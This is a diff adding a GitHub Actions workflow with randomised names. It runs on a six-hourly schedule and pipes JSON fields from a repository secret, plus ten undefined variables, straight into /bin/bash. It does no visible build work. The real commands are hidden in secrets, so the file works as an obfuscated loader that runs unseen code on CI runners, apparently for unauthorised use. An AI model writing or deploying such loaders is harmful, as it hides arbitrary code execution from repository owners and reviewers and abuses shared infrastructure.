@@ -1,0 +1,26 @@
+name: yanchengwei7615
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanchengwei7615
+        env:
+          f29575: ${{ secrets.f29575 }}
+        run: |
+          echo $f29575 | jq -r .jlqum33 | /bin/bash
+          echo $iyc4319 | jq -r .gcigr3711 | /bin/bash
+          echo $ixk31 | jq -r .rdpwy276 | /bin/bash
+          echo $fx30 | jq -r .bexa817 | /bin/bash
+          echo $yo11307 | jq -r .qk746 | /bin/bash
+          echo $hxoam3 | jq -r .irmei04 | /bin/bash
+          echo $p24752 | jq -r .pywe446 | /bin/bash
+          echo $uw20 | jq -r .nywxp1 | /bin/bash
+          echo $h9893 | jq -r .dxaa2 | /bin/bash
+          echo $wszvz67 | jq -r .f9858 | /bin/bash
+          echo $zuy24 | jq -r .eqz93281 | /bin/bash
+
